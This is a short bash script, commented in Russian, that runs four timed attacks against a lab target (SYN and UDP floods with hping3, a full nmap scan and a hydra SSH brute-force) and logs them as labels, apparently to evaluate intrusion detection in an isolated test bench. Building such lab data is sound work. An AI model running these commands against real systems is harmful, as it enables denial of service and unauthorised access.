#!/usr/bin/env bash
# Четыре сценария атак ТЗ. Запуск ТОЛЬКО на ATTACKER внутри изолированного стенда.
# Журнал запусков (UTC) служит разметкой для оценки: attacks_journal.csv
set -u
T=${TARGET:-100.64.10.20}; DUR=${DUR:-180}; PAUSE=${PAUSE:-540}
J=attacks_journal.csv
[ -f "$J" ] || echo "kind,start,end,attacker,target" > "$J"
me=$(hostname -I | awk '{print $1}')
run() {  # run <kind> <command...>
  local kind=$1; shift
  local s; s=$(date -u +%FT%T.%3NZ)
  timeout "$DUR" "$@" >/dev/null 2>&1
  echo "$kind,$s,$(date -u +%FT%T.%3NZ),$me,$T" >> "$J"
  sleep "$PAUSE"
}
run SYN-flood  hping3 -S -p 80 --flood "$T"
run UDP-flood  hping3 --udp -p 53 -d 512 --flood "$T"
run Scan       nmap -sS -T4 -p- -Pn "$T" 100.64.10.21
run Bruteforce hydra -t 4 -L users.txt -P passwords.txt -f ssh://"$T"
